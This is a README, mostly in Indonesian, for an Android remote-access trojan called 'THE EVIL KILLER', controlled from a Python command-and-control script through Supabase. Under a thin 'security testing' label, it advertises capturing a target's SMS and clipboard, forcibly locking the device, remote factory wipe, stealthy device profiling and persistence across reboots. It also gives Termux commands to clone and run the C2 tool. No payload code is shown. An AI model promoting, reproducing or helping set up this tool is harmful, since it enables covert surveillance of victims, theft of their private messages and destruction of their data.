# ── THE EVIL KILLER - XPL PROJECT ──
### [ COMMAND & CONTROL CENTER V3.4 - NATIVE RAT SYSTEM ]

  _   _             _____      _ _   _  __ _ _ _           
 | |_| |__   ___   | ____|_   _(_) | | |/ /(_) | | ___ _ __ 
 | __| '_ \ / _ \  |  _| \ \ / / | | | ' / | | | |/ _ \ '__|
 | |_| | | |  __/  | |___ \ V /| | | | . \ | | | |  __/ |   
  \__|_| |_|\___|  |_____| \_/ |_|_| |_|\_\|_|_|_|\___|_|

---

## 🛠️ OVERVIEW
**THE EVIL KILLER** adalah tools Remote Administration Tool (RAT) berbasis Android dan Python yang dirancang untuk pengujian keamanan dan monitoring perangkat jarak jauh. Dengan integrasi **Supabase Cloud**, tools ini mampu mengeksekusi perintah secara real-time ke perangkat target langsung dari terminal.

## 🔥 FEATURES
* **📡 Real-Time Monitoring:** Pantau data masuk (SMS, Clipboard, IP) dalam hitungan detik.
* **🔒 Remote Device Lock:** Mengunci layar perangkat target secara paksa (Device Admin Level).
* **💣 Factory Reset (Wipe):** Menghapus seluruh data penyimpanan internal target dari jarak jauh.
* **🕵️ Stealth Siphon:** Sadap informasi detail perangkat (RAM, CPU, Baterai, Model HP).
* **🔄 Persistence System:** Auto-run saat HP dinyalakan ulang (Boot Receiver).
* **💎 Cyberpunk UI:** Tampilan interface Terminal dengan skema warna Neon Red & Cyan.

## 📂 PROJECT STRUCTURE
* `/apk/` : Source code Android Studio (Java) untuk payload APK.
* `/tools/` : Script Python untuk Control Center (C2) di Termux/CMD.
* `the_evil_killer.py` : Script utama Command & Control.

## 🚀 INSTALLATION & SETUP

### 1. Requirements
* Python 3.x
* Library: `requests`, `colorama`
* Supabase Account (sebagai database C2)

### 2. Setup di Termux
```bash
pkg update && pkg upgrade
pkg install python
pip install requests colorama
git clone [https://github.com/vickov034-bot/the-evil-killer](https://github.com/vickov034-bot/the-evil-killer)
cd the-evil-killer
python the_evil_killer.py
